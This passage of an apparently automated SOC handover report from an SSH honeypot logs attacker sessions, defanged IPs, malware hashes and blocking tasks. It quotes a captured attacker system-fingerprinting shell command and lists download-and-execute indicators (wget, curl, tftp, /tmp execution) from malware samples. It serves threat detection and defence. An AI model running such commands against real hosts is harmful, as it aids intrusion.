| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:52:39` | `cowrie.session.connect` |
| `2026-08-07 12:52:39` | `cowrie.client.version` |
| `2026-08-07 12:52:39` | `cowrie.client.kex` |
| `2026-08-07 12:52:40` | `cowrie.login.success` |
| `2026-08-07 12:52:41` | `cowrie.session.params` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.command.success` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.command.input` |
| `2026-08-07 12:52:41` | `cowrie.log.closed` |
| `2026-08-07 12:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-730d7d7613c8

| Field | Detail |
|---|---|
| **Source IP** | `213.234.9[.]218` |
| **First Seen** | 2026-08-07 12:53 |
| **Last Seen** | 2026-08-07 12:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:53:22` | `cowrie.session.connect` |
| `2026-08-07 12:53:23` | `cowrie.client.version` |
| `2026-08-07 12:53:23` | `cowrie.client.kex` |
| `2026-08-07 12:53:23` | `cowrie.login.success` |
| `2026-08-07 12:53:24` | `cowrie.direct-tcpip.request` |
| `2026-08-07 12:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.234.9[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.234.9[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5336de53cf8e

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-08-07 12:53 |
| **Last Seen** | 2026-08-07 12:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:53:33` | `cowrie.session.connect` |
| `2026-08-07 12:53:34` | `cowrie.client.version` |
| `2026-08-07 12:53:34` | `cowrie.client.kex` |
| `2026-08-07 12:53:36` | `cowrie.login.success` |
| `2026-08-07 12:53:36` | `cowrie.direct-tcpip.request` |
| `2026-08-07 12:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3adbe8733345

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-07 12:54 |
| **Last Seen** | 2026-08-07 12:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 12:54:18` | `cowrie.session.connect` |
| `2026-08-07 12:54:18` | `cowrie.client.version` |
| `2026-08-07 12:54:18` | `cowrie.client.kex` |
| `2026-08-07 12:54:20` | `cowrie.login.success` |
| `2026-08-07 12:54:21` | `cowrie.session.params` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.command.success` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.command.input` |
| `2026-08-07 12:54:21` | `cowrie.log.closed` |
| `2026-08-07 12:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **190** | 2026-08-07 10:55 | 2026-08-07 12:55 | 124m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-07 10:59 | 2026-08-07 12:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-07 12:47 | 2026-08-07 12:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-07 11:19 | 2026-08-07 11:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **2** | 2026-08-07 11:57 | 2026-08-07 12:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.194[.]137` | 1 | 2026-08-07 11:43 | 2026-08-07 11:44 | 5s | 0 | `T1592` | 🟢 LOW |
| `183.171.57[.]164` | 1 | 2026-08-07 12:13 | 2026-08-07 12:13 | 2s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]81` | 1 | 2026-08-07 12:08 | 2026-08-07 12:08 | 2s | 0 | `T1592` | 🟢 LOW |
| `37.139.165[.]127` | 1 | 2026-08-07 12:02 | 2026-08-07 12:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.10.91[.]135` | 1 | 2026-08-07 11:42 | 2026-08-07 11:42 | 25s | 0 | `T1592` | 🟢 LOW |
| `45.172.37[.]167` | 1 | 2026-08-07 12:06 | 2026-08-07 12:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.200.230[.]73` | 1 | 2026-08-07 11:45 | 2026-08-07 11:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.17.6[.]119` | 1 | 2026-08-07 11:41 | 2026-08-07 11:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.145.181[.]7` | 1 | 2026-08-07 12:30 | 2026-08-07 12:30 | 5s | 0 | `T1592` | 🟢 LOW |
| `8.210.149[.]239` | 1 | 2026-08-07 12:51 | 2026-08-07 12:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.99.159[.]65` | 1 | 2026-08-07 11:57 | 2026-08-07 11:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.193.131[.]98` | 1 | 2026-08-07 12:51 | 2026-08-07 12:51 | 11s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **30/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 44/100 | 🟡 MEDIUM | **34/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `182.76.71[.]82` | IN | YAJNA TECHNOLOGIS PVT. LT | **100** ⚠️ | 50 |
| `196.191.142[.]67` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `183.171.57[.]164` | MY | Celcom Axiata Berhad | **100** ⚠️ | 9 |
| `178.178.222[.]59` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `46.200.230[.]73` | UA | JSC Ukrtelecom | **100** ⚠️ | 0 |
| `60.166.8[.]174` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `180.76.104[.]208` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `65.20.202[.]4` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `111.70.10[.]15` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `186.215.107[.]189` | BR | Exponencial Serviços de Cons. e Asses. Ltda | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 108 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 97 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 30 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 30 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 30 |

---

## 🔕 False Positive Summary (93 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 78 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 369 cases |
| Tool 34  | Credential Extractor        | ✅ 110 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 93 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 93 filtered (25.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 66 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 61 priority case(s) shown individually · 17 recon entry/entries in table (5 group(s) consolidating 203 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-07T13:12:34Z_
